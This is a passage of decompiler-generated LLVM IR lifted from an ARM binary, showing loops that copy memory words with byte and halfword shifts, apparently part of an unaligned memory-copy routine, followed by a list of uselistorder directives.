  store i32 %v5_1572c, i32* %v2_15730, align 4
  %v4_15730 = add i32 %v0_15730, -12
  %v5_15730 = inttoptr i32 %v4_15730 to i32*
  %v6_15730 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_15730, i32* %v5_15730, align 4
  %v7_15730 = add i32 %v0_15730, -8
  %v8_15730 = inttoptr i32 %v7_15730 to i32*
  %v9_15730 = load i32, i32* @ip, align 4
  store i32 %v9_15730, i32* %v8_15730, align 4
  %v10_15730 = add i32 %v0_15730, -4
  %v11_15730 = inttoptr i32 %v10_15730 to i32*
  %v12_15730 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15730, i32* %v11_15730, align 4
  store i32 %v1_15730, i32* %r0.global-to-local, align 4
  %v0_15734 = load i32, i32* %r2.global-to-local, align 4
  %v2_15734 = add i32 %v0_15734, -16
  store i32 %v2_15734, i32* %r2.global-to-local, align 4
  %v6_15738 = icmp slt i32 %v0_15734, 16
  br i1 %v6_15738, label %dec_label_pc_1573c, label %dec_label_pc_1570c.dec_label_pc_1570c_crit_edge

dec_label_pc_1570c.dec_label_pc_1570c_crit_edge:  ; preds = %dec_label_pc_1570c
  %v0_1570c.pre = load i32, i32* @r3, align 4
  %v0_15710.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1570c

dec_label_pc_1573c:                               ; preds = %dec_label_pc_1570c
  %v2_1573c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1573c, i32* @r4, align 4
  %v5_1573c = load i8*, i8** %stack_var_-8, align 4
  %v6_1573c = ptrtoint i8* %v5_1573c to i32
  store i32 %v6_1573c, i32* @r5, align 4
  store i32 %v11_15708, i32* @lr, align 4
  %v2_15740 = add i32 %v0_15734, -4
  store i32 %v2_15740, i32* %r2.global-to-local, align 4
  %v4_15740 = add i32 %v0_15734, 2147483632
  %v5_15740 = and i32 %v2_15740, %v4_15740
  %v6_15740 = icmp slt i32 %v5_15740, 0
  store i1 %v6_15740, i1* %cpsr_v.global-to-local, align 1
  %v7_15740 = icmp slt i32 %v2_15740, 0
  store i1 %v7_15740, i1* %cpsr_n.global-to-local, align 1
  %v8_15740 = icmp eq i32 %v2_15740, 0
  store i1 %v8_15740, i1* %cpsr_z.global-to-local, align 1
  %v5_15744 = icmp slt i32 %v2_15734, -12
  br i1 %v5_15744, label %dec_label_pc_15760, label %dec_label_pc_15748

dec_label_pc_15748:                               ; preds = %dec_label_pc_1573c, %dec_label_pc_156fc, %dec_label_pc_15748
  %v1_15754 = phi i32 [ %v5_15754, %dec_label_pc_15748 ], [ %v1_15730, %dec_label_pc_1573c ], [ %v0_1573019, %dec_label_pc_156fc ]
  %v0_15748 = load i32, i32* @r3, align 4
  %v3_15748 = mul i32 %v0_15748, 256
  store i32 %v3_15748, i32* %ip.global-to-local, align 4
  %v0_1574c = load i32, i32* %r1.global-to-local, align 4
  %v1_1574c = add i32 %v0_1574c, -4
  %v2_1574c = inttoptr i32 %v1_1574c to i32*
  %v3_1574c = load i32, i32* %v2_1574c, align 4
  store i32 %v3_1574c, i32* @r3, align 4
  store i32 %v1_1574c, i32* %r1.global-to-local, align 4
  %v4_15750 = udiv i32 %v3_1574c, 16777216
  %v5_15750 = or i32 %v4_15750, %v3_15748
  store i32 %v5_15750, i32* @ip, align 4
  %v2_15754 = add i32 %v1_15754, -4
  %v3_15754 = inttoptr i32 %v2_15754 to i32*
  store i32 %v5_15750, i32* %v3_15754, align 4
  %v4_15754 = load i32, i32* %r0.global-to-local, align 4
  %v5_15754 = add i32 %v4_15754, -4
  store i32 %v5_15754, i32* %r0.global-to-local, align 4
  %v0_15758 = load i32, i32* %r2.global-to-local, align 4
  %v2_15758 = add i32 %v0_15758, -4
  store i32 %v2_15758, i32* %r2.global-to-local, align 4
  %v6_1575c = icmp slt i32 %v0_15758, 4
  br i1 %v6_1575c, label %dec_label_pc_15760.loopexit, label %dec_label_pc_15748

dec_label_pc_15760.loopexit:                      ; preds = %dec_label_pc_15748
  %v4_15758 = sub i32 3, %v0_15758
  %v5_15758 = and i32 %v4_15758, %v0_15758
  %v6_15758 = icmp slt i32 %v5_15758, 0
  %v7_15758 = icmp slt i32 %v2_15758, 0
  store i1 %v6_15758, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15758, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15760

dec_label_pc_15760:                               ; preds = %dec_label_pc_15760.loopexit, %dec_label_pc_1573c
  %v2_156a451 = phi i32 [ %v5_15754, %dec_label_pc_15760.loopexit ], [ %v1_15730, %dec_label_pc_1573c ]
  %v0_1569447 = phi i32 [ %v2_15758, %dec_label_pc_15760.loopexit ], [ %v2_15740, %dec_label_pc_1573c ]
  %v0_15760 = load i32, i32* %r1.global-to-local, align 4
  %v1_15760 = add i32 %v0_15760, 3
  store i32 %v1_15760, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_15768:                               ; preds = %dec_label_pc_156f8
  br i1 %v5_157d8, label %dec_label_pc_157b4, label %dec_label_pc_15770

dec_label_pc_15770:                               ; preds = %dec_label_pc_15768
  store i32 %v2_157d4, i32* %r2.global-to-local, align 4
  %v3_15774 = load i32, i32* @r4, align 4
  store i32 %v3_15774, i32* %stack_var_-12, align 4
  %v6_15774 = load i32, i32* @r5, align 4
  %v8_15774 = inttoptr i32 %v6_15774 to i8*
  store i8* %v8_15774, i8** %stack_var_-8, align 4
  %v11_15774 = load i32, i32* @lr, align 4
  br label %dec_label_pc_15778

dec_label_pc_15778:                               ; preds = %dec_label_pc_15778.dec_label_pc_15778_crit_edge, %dec_label_pc_15770
  %v0_1579c = phi i32 [ %v1_1579c, %dec_label_pc_15778.dec_label_pc_15778_crit_edge ], [ %v0_1573019, %dec_label_pc_15770 ]
  %v0_1577c = phi i32 [ %v0_1577c.pre, %dec_label_pc_15778.dec_label_pc_15778_crit_edge ], [ %v1_156e8, %dec_label_pc_15770 ]
  %v0_15778 = phi i32 [ %v0_15778.pre, %dec_label_pc_15778.dec_label_pc_15778_crit_edge ], [ %v2_156ec, %dec_label_pc_15770 ]
  %v3_15778 = mul i32 %v0_15778, 65536
  store i32 %v3_15778, i32* %lr.global-to-local, align 4
  %v1_1577c = add i32 %v0_1577c, -4
  %v2_1577c = inttoptr i32 %v1_1577c to i32*
  %v3_1577c = load i32, i32* %v2_1577c, align 4
  store i32 %v3_1577c, i32* @r3, align 4
  %v4_1577c = add i32 %v0_1577c, -8
  %v5_1577c = inttoptr i32 %v4_1577c to i32*
  %v6_1577c = load i32, i32* %v5_1577c, align 4
  store i32 %v6_1577c, i32* %r4.global-to-local, align 4
  %v7_1577c = add i32 %v0_1577c, -12
  %v8_1577c = inttoptr i32 %v7_1577c to i32*
  %v9_1577c = load i32, i32* %v8_1577c, align 4
  store i32 %v9_1577c, i32* %r5.global-to-local, align 4
  %v10_1577c = add i32 %v0_1577c, -16
  %v11_1577c = inttoptr i32 %v10_1577c to i32*
  %v12_1577c = load i32, i32* %v11_1577c, align 4
  store i32 %v10_1577c, i32* %r1.global-to-local, align 4
  %v4_15780 = udiv i32 %v12_1577c, 65536
  %v5_15780 = or i32 %v4_15780, %v3_15778
  store i32 %v5_15780, i32* %lr.global-to-local, align 4
  %v3_15784 = mul i32 %v12_1577c, 65536
  %v4_15788 = udiv i32 %v9_1577c, 65536
  %v5_15788 = or i32 %v3_15784, %v4_15788
  store i32 %v5_15788, i32* @ip, align 4
  %v3_1578c = mul i32 %v9_1577c, 65536
  %v4_15790 = udiv i32 %v6_1577c, 65536
  %v5_15790 = or i32 %v3_1578c, %v4_15790
  store i32 %v5_15790, i32* %r5.global-to-local, align 4
  %v3_15794 = mul i32 %v6_1577c, 65536
  %v4_15798 = udiv i32 %v3_1577c, 65536
  %v5_15798 = or i32 %v3_15794, %v4_15798
  store i32 %v5_15798, i32* %r4.global-to-local, align 4
  %v1_1579c = add i32 %v0_1579c, -16
  %v2_1579c = inttoptr i32 %v1_1579c to i32*
  store i32 %v5_15798, i32* %v2_1579c, align 4
  %v4_1579c = add i32 %v0_1579c, -12
  %v5_1579c = inttoptr i32 %v4_1579c to i32*
  %v6_1579c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_1579c, i32* %v5_1579c, align 4
  %v7_1579c = add i32 %v0_1579c, -8
  %v8_1579c = inttoptr i32 %v7_1579c to i32*
  %v9_1579c = load i32, i32* @ip, align 4
  store i32 %v9_1579c, i32* %v8_1579c, align 4
  %v10_1579c = add i32 %v0_1579c, -4
  %v11_1579c = inttoptr i32 %v10_1579c to i32*
  %v12_1579c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1579c, i32* %v11_1579c, align 4
  store i32 %v1_1579c, i32* %r0.global-to-local, align 4
  %v0_157a0 = load i32, i32* %r2.global-to-local, align 4
  %v2_157a0 = add i32 %v0_157a0, -16
  store i32 %v2_157a0, i32* %r2.global-to-local, align 4
  %v6_157a4 = icmp slt i32 %v0_157a0, 16
  br i1 %v6_157a4, label %dec_label_pc_157a8, label %dec_label_pc_15778.dec_label_pc_15778_crit_edge

dec_label_pc_15778.dec_label_pc_15778_crit_edge:  ; preds = %dec_label_pc_15778
  %v0_15778.pre = load i32, i32* @r3, align 4
  %v0_1577c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15778

dec_label_pc_157a8:                               ; preds = %dec_label_pc_15778
  %v2_157a8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_157a8, i32* @r4, align 4
  %v5_157a8 = load i8*, i8** %stack_var_-8, align 4
  %v6_157a8 = ptrtoint i8* %v5_157a8 to i32
  store i32 %v6_157a8, i32* @r5, align 4
  store i32 %v11_15774, i32* @lr, align 4
  %v2_157ac = add i32 %v0_157a0, -4
  store i32 %v2_157ac, i32* %r2.global-to-local, align 4
  %v4_157ac = add i32 %v0_157a0, 2147483632
  %v5_157ac = and i32 %v2_157ac, %v4_157ac
  %v6_157ac = icmp slt i32 %v5_157ac, 0
  store i1 %v6_157ac, i1* %cpsr_v.global-to-local, align 1
  %v7_157ac = icmp slt i32 %v2_157ac, 0
  store i1 %v7_157ac, i1* %cpsr_n.global-to-local, align 1
  %v8_157ac = icmp eq i32 %v2_157ac, 0
  store i1 %v8_157ac, i1* %cpsr_z.global-to-local, align 1
  %v5_157b0 = icmp slt i32 %v2_157a0, -12
  br i1 %v5_157b0, label %dec_label_pc_157cc, label %dec_label_pc_157b4

dec_label_pc_157b4:                               ; preds = %dec_label_pc_157a8, %dec_label_pc_15768, %dec_label_pc_157b4
  %v1_157c0 = phi i32 [ %v5_157c0, %dec_label_pc_157b4 ], [ %v1_1579c, %dec_label_pc_157a8 ], [ %v0_1573019, %dec_label_pc_15768 ]
  %v0_157b4 = load i32, i32* @r3, align 4
  %v3_157b4 = mul i32 %v0_157b4, 65536
  store i32 %v3_157b4, i32* %ip.global-to-local, align 4
  %v0_157b8 = load i32, i32* %r1.global-to-local, align 4
  %v1_157b8 = add i32 %v0_157b8, -4
  %v2_157b8 = inttoptr i32 %v1_157b8 to i32*
  %v3_157b8 = load i32, i32* %v2_157b8, align 4
  store i32 %v3_157b8, i32* @r3, align 4
  store i32 %v1_157b8, i32* %r1.global-to-local, align 4
  %v4_157bc = udiv i32 %v3_157b8, 65536
  %v5_157bc = or i32 %v4_157bc, %v3_157b4
  store i32 %v5_157bc, i32* @ip, align 4
  %v2_157c0 = add i32 %v1_157c0, -4
  %v3_157c0 = inttoptr i32 %v2_157c0 to i32*
  store i32 %v5_157bc, i32* %v3_157c0, align 4
  %v4_157c0 = load i32, i32* %r0.global-to-local, align 4
  %v5_157c0 = add i32 %v4_157c0, -4
  store i32 %v5_157c0, i32* %r0.global-to-local, align 4
  %v0_157c4 = load i32, i32* %r2.global-to-local, align 4
  %v2_157c4 = add i32 %v0_157c4, -4
  store i32 %v2_157c4, i32* %r2.global-to-local, align 4
  %v6_157c8 = icmp slt i32 %v0_157c4, 4
  br i1 %v6_157c8, label %dec_label_pc_157cc.loopexit, label %dec_label_pc_157b4

dec_label_pc_157cc.loopexit:                      ; preds = %dec_label_pc_157b4
  %v4_157c4 = sub i32 3, %v0_157c4
  %v5_157c4 = and i32 %v4_157c4, %v0_157c4
  %v6_157c4 = icmp slt i32 %v5_157c4, 0
  %v7_157c4 = icmp slt i32 %v2_157c4, 0
  store i1 %v6_157c4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_157c4, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_157cc

dec_label_pc_157cc:                               ; preds = %dec_label_pc_157cc.loopexit, %dec_label_pc_157a8
  %v2_156a452 = phi i32 [ %v5_157c0, %dec_label_pc_157cc.loopexit ], [ %v1_1579c, %dec_label_pc_157a8 ]
  %v0_1569448 = phi i32 [ %v2_157c4, %dec_label_pc_157cc.loopexit ], [ %v2_157ac, %dec_label_pc_157a8 ]
  %v0_157cc = load i32, i32* %r1.global-to-local, align 4
  %v1_157cc = add i32 %v0_157cc, 2
  store i32 %v1_157cc, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_157d4:                               ; preds = %dec_label_pc_156e8
  br i1 %v5_157d8, label %dec_label_pc_15820, label %dec_label_pc_157dc

dec_label_pc_157dc:                               ; preds = %dec_label_pc_157d4
  store i32 %v2_157d4, i32* %r2.global-to-local, align 4
  %v3_157e0 = load i32, i32* @r4, align 4
  store i32 %v3_157e0, i32* %stack_var_-12, align 4
  %v6_157e0 = load i32, i32* @r5, align 4
  %v8_157e0 = inttoptr i32 %v6_157e0 to i8*
  store i8* %v8_157e0, i8** %stack_var_-8, align 4
  %v11_157e0 = load i32, i32* @lr, align 4
  br label %dec_label_pc_157e4

dec_label_pc_157e4:                               ; preds = %dec_label_pc_157e4.dec_label_pc_157e4_crit_edge, %dec_label_pc_157dc
  %v0_15808 = phi i32 [ %v1_15808, %dec_label_pc_157e4.dec_label_pc_157e4_crit_edge ], [ %v0_1573019, %dec_label_pc_157dc ]
  %v0_157e8 = phi i32 [ %v0_157e8.pre, %dec_label_pc_157e4.dec_label_pc_157e4_crit_edge ], [ %v1_156e8, %dec_label_pc_157dc ]
  %v0_157e4 = phi i32 [ %v0_157e4.pre, %dec_label_pc_157e4.dec_label_pc_157e4_crit_edge ], [ %v2_156ec, %dec_label_pc_157dc ]
  %v3_157e4 = mul i32 %v0_157e4, 16777216
  store i32 %v3_157e4, i32* %lr.global-to-local, align 4
  %v1_157e8 = add i32 %v0_157e8, -4
  %v2_157e8 = inttoptr i32 %v1_157e8 to i32*
  %v3_157e8 = load i32, i32* %v2_157e8, align 4
  store i32 %v3_157e8, i32* @r3, align 4
  %v4_157e8 = add i32 %v0_157e8, -8
  %v5_157e8 = inttoptr i32 %v4_157e8 to i32*
  %v6_157e8 = load i32, i32* %v5_157e8, align 4
  store i32 %v6_157e8, i32* %r4.global-to-local, align 4
  %v7_157e8 = add i32 %v0_157e8, -12
  %v8_157e8 = inttoptr i32 %v7_157e8 to i32*
  %v9_157e8 = load i32, i32* %v8_157e8, align 4
  store i32 %v9_157e8, i32* %r5.global-to-local, align 4
  %v10_157e8 = add i32 %v0_157e8, -16
  %v11_157e8 = inttoptr i32 %v10_157e8 to i32*
  %v12_157e8 = load i32, i32* %v11_157e8, align 4
  store i32 %v10_157e8, i32* %r1.global-to-local, align 4
  %v4_157ec = udiv i32 %v12_157e8, 256
  %v5_157ec = or i32 %v4_157ec, %v3_157e4
  store i32 %v5_157ec, i32* %lr.global-to-local, align 4
  %v3_157f0 = mul i32 %v12_157e8, 16777216
  %v4_157f4 = udiv i32 %v9_157e8, 256
  %v5_157f4 = or i32 %v3_157f0, %v4_157f4
  store i32 %v5_157f4, i32* @ip, align 4
  %v3_157f8 = mul i32 %v9_157e8, 16777216
  %v4_157fc = udiv i32 %v6_157e8, 256
  %v5_157fc = or i32 %v3_157f8, %v4_157fc
  store i32 %v5_157fc, i32* %r5.global-to-local, align 4
  %v3_15800 = mul i32 %v6_157e8, 16777216
  %v4_15804 = udiv i32 %v3_157e8, 256
  %v5_15804 = or i32 %v3_15800, %v4_15804
  store i32 %v5_15804, i32* %r4.global-to-local, align 4
  %v1_15808 = add i32 %v0_15808, -16
  %v2_15808 = inttoptr i32 %v1_15808 to i32*
  store i32 %v5_15804, i32* %v2_15808, align 4
  %v4_15808 = add i32 %v0_15808, -12
  %v5_15808 = inttoptr i32 %v4_15808 to i32*
  %v6_15808 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_15808, i32* %v5_15808, align 4
  %v7_15808 = add i32 %v0_15808, -8
  %v8_15808 = inttoptr i32 %v7_15808 to i32*
  %v9_15808 = load i32, i32* @ip, align 4
  store i32 %v9_15808, i32* %v8_15808, align 4
  %v10_15808 = add i32 %v0_15808, -4
  %v11_15808 = inttoptr i32 %v10_15808 to i32*
  %v12_15808 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15808, i32* %v11_15808, align 4
  store i32 %v1_15808, i32* %r0.global-to-local, align 4
  %v0_1580c = load i32, i32* %r2.global-to-local, align 4
  %v2_1580c = add i32 %v0_1580c, -16
  store i32 %v2_1580c, i32* %r2.global-to-local, align 4
  %v6_15810 = icmp slt i32 %v0_1580c, 16
  br i1 %v6_15810, label %dec_label_pc_15814, label %dec_label_pc_157e4.dec_label_pc_157e4_crit_edge

dec_label_pc_157e4.dec_label_pc_157e4_crit_edge:  ; preds = %dec_label_pc_157e4
  %v0_157e4.pre = load i32, i32* @r3, align 4
  %v0_157e8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_157e4

dec_label_pc_15814:                               ; preds = %dec_label_pc_157e4
  %v2_15814 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15814, i32* @r4, align 4
  %v5_15814 = load i8*, i8** %stack_var_-8, align 4
  %v6_15814 = ptrtoint i8* %v5_15814 to i32
  store i32 %v6_15814, i32* @r5, align 4
  store i32 %v11_157e0, i32* @lr, align 4
  %v2_15818 = add i32 %v0_1580c, -4
  store i32 %v2_15818, i32* %r2.global-to-local, align 4
  %v4_15818 = add i32 %v0_1580c, 2147483632
  %v5_15818 = and i32 %v2_15818, %v4_15818
  %v6_15818 = icmp slt i32 %v5_15818, 0
  store i1 %v6_15818, i1* %cpsr_v.global-to-local, align 1
  %v7_15818 = icmp slt i32 %v2_15818, 0
  store i1 %v7_15818, i1* %cpsr_n.global-to-local, align 1
  %v8_15818 = icmp eq i32 %v2_15818, 0
  store i1 %v8_15818, i1* %cpsr_z.global-to-local, align 1
  %v5_1581c = icmp slt i32 %v2_1580c, -12
  br i1 %v5_1581c, label %dec_label_pc_15838, label %dec_label_pc_15820

dec_label_pc_15820:                               ; preds = %dec_label_pc_15814, %dec_label_pc_157d4, %dec_label_pc_15820
  %v1_1582c = phi i32 [ %v5_1582c, %dec_label_pc_15820 ], [ %v1_15808, %dec_label_pc_15814 ], [ %v0_1573019, %dec_label_pc_157d4 ]
  %v0_15820 = load i32, i32* @r3, align 4
  %v3_15820 = mul i32 %v0_15820, 16777216
  store i32 %v3_15820, i32* %ip.global-to-local, align 4
  %v0_15824 = load i32, i32* %r1.global-to-local, align 4
  %v1_15824 = add i32 %v0_15824, -4
  %v2_15824 = inttoptr i32 %v1_15824 to i32*
  %v3_15824 = load i32, i32* %v2_15824, align 4
  store i32 %v3_15824, i32* @r3, align 4
  store i32 %v1_15824, i32* %r1.global-to-local, align 4
  %v4_15828 = udiv i32 %v3_15824, 256
  %v5_15828 = or i32 %v4_15828, %v3_15820
  store i32 %v5_15828, i32* @ip, align 4
  %v2_1582c = add i32 %v1_1582c, -4
  %v3_1582c = inttoptr i32 %v2_1582c to i32*
  store i32 %v5_15828, i32* %v3_1582c, align 4
  %v4_1582c = load i32, i32* %r0.global-to-local, align 4
  %v5_1582c = add i32 %v4_1582c, -4
  store i32 %v5_1582c, i32* %r0.global-to-local, align 4
  %v0_15830 = load i32, i32* %r2.global-to-local, align 4
  %v2_15830 = add i32 %v0_15830, -4
  store i32 %v2_15830, i32* %r2.global-to-local, align 4
  %v6_15834 = icmp slt i32 %v0_15830, 4
  br i1 %v6_15834, label %dec_label_pc_15838.loopexit, label %dec_label_pc_15820

dec_label_pc_15838.loopexit:                      ; preds = %dec_label_pc_15820
  %v4_15830 = sub i32 3, %v0_15830
  %v5_15830 = and i32 %v4_15830, %v0_15830
  %v6_15830 = icmp slt i32 %v5_15830, 0
  %v7_15830 = icmp slt i32 %v2_15830, 0
  store i1 %v6_15830, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15830, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15838

dec_label_pc_15838:                               ; preds = %dec_label_pc_15838.loopexit, %dec_label_pc_15814
  %v2_156a453 = phi i32 [ %v5_1582c, %dec_label_pc_15838.loopexit ], [ %v1_15808, %dec_label_pc_15814 ]
  %v0_1569449 = phi i32 [ %v2_15830, %dec_label_pc_15838.loopexit ], [ %v2_15818, %dec_label_pc_15814 ]
  %v0_15838 = load i32, i32* %r1.global-to-local, align 4
  %v1_15838 = add i32 %v0_15838, 1
  store i32 %v1_15838, i32* %r1.global-to-local, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_1582c, { 0, 2, 1 }
  uselistorder i32 %v3_15820, { 1, 0 }
  uselistorder i32 %v2_15818, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_15808, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_157e8, { 1, 0 }
  uselistorder i32 %v3_157e4, { 1, 0 }
  uselistorder i32 %v0_157e8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15808, { 3, 2, 1, 0 }
  uselistorder i32 %v5_157c0, { 0, 2, 1 }
  uselistorder i32 %v3_157b4, { 1, 0 }
  uselistorder i32 %v2_157ac, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1579c, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_1577c, { 1, 0 }
  uselistorder i32 %v3_15778, { 1, 0 }
  uselistorder i32 %v0_1577c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1579c, { 3, 2, 1, 0 }
  uselistorder i32 %v5_15754, { 0, 2, 1 }
  uselistorder i32 %v3_15748, { 1, 0 }
  uselistorder i32 %v2_15740, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_15730, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_15710, { 1, 0 }
  uselistorder i32 %v3_1570c, { 1, 0 }
  uselistorder i32 %v0_15710, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15730, { 3, 2, 1, 0 }
  uselistorder i1 %v5_157d8, { 2, 0, 1 }
  uselistorder i32 %v0_156f0, { 1, 0 }
  uselistorder i32 %v0_157dc, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_1573019, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_156e0, { 2, 1, 0 }
  uselistorder i32 %v0_156e0, { 2, 0, 1 }
  uselistorder i32 %v2_156d8, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_156d8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_156d8, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1573020, { 2, 1, 0 }
  uselistorder i32 %v11_156b4, { 1, 0 }
  uselistorder i32 %v7_156b4, { 1, 0 }
  uselistorder i32 %v1_15694, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_15694, { 1, 2, 0, 3 }
  uselistorder i32 %v2_15698, { 1, 0 }
  uselistorder i32 %v7_1568c, { 0, 2, 1 }
  uselistorder i32 %v10_15688, { 1, 0 }
  uselistorder i32 %v9_15680, { 1, 0, 2 }
  uselistorder i32 %v6_1567c, { 1, 0 }
  uselistorder i32 %v2_15674, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_15674, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_15684, { 0, 3, 2, 1 }
  uselistorder i32 %v7_15668, { 0, 2, 1 }
  uselistorder i32 %v13_15664, { 1, 0 }
  uselistorder i32 %v4_15660, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_15660, { 2, 0, 1 }
  uselistorder i32 %v6_15668, { 0, 3, 2, 1 }
  uselistorder i32 %v7_15658, { 0, 2, 1 }
  uselistorder i32 %v16_15654, { 1, 0 }
  uselistorder i32 %v4_15650, { 1, 2, 0 }
  uselistorder i32 %v0_15660.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_15658, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_15644, { 0, 3, 2, 1 }
  uselistorder i32 %v10_15640, { 1, 0 }
  uselistorder i32 %v1_1563c, { 1, 0 }
  uselistorder i32 %v10_15638, { 1, 0 }
  uselistorder i32 %v0_15638, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1563c, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_15630, { 0, 2, 1 }
  uselistorder i32 %v2_15624, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_15624, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_1563c37, { 1, 2, 0 }
  uselistorder i32 %v1_1561c, { 2, 1, 0 }
  uselistorder i32 %v1_15614, { 2, 3, 1, 0 }
  uselistorder i32 %v2_1560c, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_15608, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_15604, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_15604, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_155f4, { 0, 2, 1 }
  uselistorder i32 %v4_155f0, { 1, 0 }
  uselistorder i32 %v3_155e4, { 1, 0 }
  uselistorder i32 %v1_155dc, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_155d0, { 1, 0 }
  uselistorder i32 %v12_155cc, { 0, 2, 1 }
  uselistorder i32 %v8_155ac, { 1, 0, 2 }
  uselistorder i32 %v5_155ac, { 1, 0, 2 }
  uselistorder i32 %v2_155ac, { 1, 0, 2 }
  uselistorder i32 %v0_155ac, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_155cc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_15588, { 0, 2, 1 }
  uselistorder i32 %v4_15584, { 1, 0 }
  uselistorder i32 %v3_15578, { 1, 0 }
  uselistorder i32 %v1_15570, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_15564, { 1, 0 }
  uselistorder i32 %v12_15560, { 0, 2, 1 }
  uselistorder i32 %v8_15540, { 1, 0, 2 }
  uselistorder i32 %v5_15540, { 1, 0, 2 }
  uselistorder i32 %v2_15540, { 1, 0, 2 }
  uselistorder i32 %v0_15540, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_15560, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1551c, { 0, 2, 1 }
  uselistorder i32 %v4_15518, { 1, 0 }
  uselistorder i32 %v3_1550c, { 1, 0 }
  uselistorder i32 %v1_15504, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_154f8, { 1, 0 }
  uselistorder i32 %v12_154f4, { 0, 2, 1 }
  uselistorder i32 %v8_154d4, { 1, 0, 2 }
  uselistorder i32 %v5_154d4, { 1, 0, 2 }
  uselistorder i32 %v2_154d4, { 1, 0, 2 }
  uselistorder i32 %v0_154d4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_154f4, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_15530, { 0, 2, 1 }
  uselistorder i32 %v1_1552c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_154b0, { 2, 0, 1, 3 }
  uselistorder i32 %v2_154b0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_15534, { 1, 0, 3, 2 }
  uselistorder i32 %v0_155cc76, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_154a4, { 1, 0 }
  uselistorder i32 %v0_154a4, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1549c, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_1549c, { 1, 0, 2 }
  uselistorder i32 %v0_1549c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_155cc77, { 1, 0 }
  uselistorder i32 %v1_1547c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_15484, { 1, 0 }
  uselistorder i32 %v0_15458, { 3, 0, 1, 2 }
  uselistorder i32 %v1_1544c, { 1, 2, 0, 3 }
  uselistorder i32 %v5_15438, { 1, 0, 2 }
  uselistorder i32 %v1_15434, { 1, 0 }
  uselistorder i32 %v1_1542c, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_1542c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_15424, { 0, 2, 1 }
  uselistorder i32 %v3_15424, { 3, 0, 1, 2 }
  uselistorder i1 %v0_15424, { 1, 0 }
  uselistorder i1 %v1_15424, { 1, 0 }
  uselistorder i32 %v3_15420, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_15418, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_15404, { 1, 2, 0 }
  uselistorder i32 %v1_153fc, { 0, 2, 1 }
  uselistorder i32 %v12_153f8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_153ec, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_153f0, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_153e0, { 0, 2, 1 }
  uselistorder i32 %v1_153d8, { 0, 1, 2, 4, 3 }
